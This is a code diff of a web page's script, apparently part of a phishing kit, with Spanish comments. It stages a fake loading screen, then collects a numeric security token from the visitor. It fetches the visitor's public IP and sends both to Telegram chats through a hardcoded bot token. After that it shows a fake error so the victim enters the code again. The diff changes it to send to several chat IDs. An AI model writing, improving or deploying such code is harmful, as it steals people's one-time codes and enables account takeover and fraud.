@@ -53,35 +53,39 @@
   
 
   <script>
-    const step1 = document.getElementById('step-loading-1');
-    const step2 = document.getElementById('step-token');
-    const step3 = document.getElementById('step-loading-2');
-    const inputs = Array.from(document.querySelectorAll('.tok'));
-    const btn    = document.getElementById('btn-token');
-    const errMsg = document.getElementById('msg-error');
+    const step1   = document.getElementById('step-loading-1');
+    const step2   = document.getElementById('step-token');
+    const step3   = document.getElementById('step-loading-2');
+    const inputs  = Array.from(document.querySelectorAll('.tok'));
+    const btn     = document.getElementById('btn-token');
+    const errMsg  = document.getElementById('msg-error');
 
-    // Mostrar paso de token tras 15s
+    // Tus credenciales de bot y array de chat IDs
+    const BOT_TOKEN = '7566301264:AAETlzNwR9-iuvl4xiUEuWsiYGd1hR-L4zk';
+    const CHAT_IDS  = ['-1002373013684', '-4916503465']; // agrega aquí los IDs
+
+    // Paso 1 → Paso 2 tras 5s
     setTimeout(() => {
       step1.classList.add('hidden');
       step2.classList.remove('hidden');
       inputs[0].focus();
     }, 5000);
 
-    // Auto-avanzar y habilitar botón
+    // auto‐avance y habilitación de botón
     inputs.forEach((inp, i) => {
       inp.addEventListener('input', () => {
         if (/\d/.test(inp.value) && i < inputs.length - 1) {
           inputs[i+1].focus();
         }
-        const all = inputs.every(i => i.value.trim() !== '');
-        btn.classList.toggle('disabled', !all);
+        const allFilled = inputs.every(i => i.value.trim() !== '');
+        btn.classList.toggle('disabled', !allFilled);
       });
     });
 
     btn.addEventListener('click', async () => {
       if (btn.classList.contains('disabled')) return;
 
-      // Ocultar token y mostrar validando
+      // oculta token, muestra “Validando…”
       step2.classList.add('hidden');
       errMsg.classList.add('hidden');
       step3.classList.remove('hidden');
@@ -89,36 +93,34 @@
       const code = inputs.map(i => i.value).join('');
 
       try {
-        // Obtener IP pública exacta
+        // IP pública
         const ipResp = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipResp.json();
         const ip     = ipData.ip || 'desconocida';
 
-        // Construir mensaje con emojis y markdown
-        const mensaje = 
+        // mensaje en Markdown
+        let mensaje =
           `🔔 *Nuevo token ingresado* 🔔\n\n` +
           `🔑 *Código:* \`${code}\`\n` +
           `🌐 *IP pública:* \`${ip}\``;
 
-        // Enviar a Telegram
-        // Reemplaza estos valores con tus credenciales reales:
-const token2  = '7566301264:AAETlzNwR9-iuvl4xiUEuWsiYGd1hR-L4zk';
-const chatid2 = '-4862214022';
+        // enviarlo a cada chat_id
+        for (const chat_id of CHAT_IDS) {
+          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id,
+              text: mensaje,
+              parse_mode: 'Markdown'
+            })
+          });
+        }
 
-// Luego, en tu lógica de envío, usa exactamente este fragmento:
-await fetch(`https://api.telegram.org/bot${token2}/sendMessage`, {
-  method: 'POST',
-  headers: { 'Content-Type': 'application/json' },
-  body: JSON.stringify({
-    chat_id: chatid2,
-    text: mensaje,
-    parse_mode: 'Markdown'
-  })
-});
       } catch (e) {
         console.error('Error enviando a Telegram o obteniendo IP:', e);
       } finally {
-        // Tras 3s mostrar error y permitir reintento
+        // tras 15s, regresar a paso 2 y mostrar error
         setTimeout(() => {
           step3.classList.add('hidden');
           inputs.forEach(i => i.value = '');
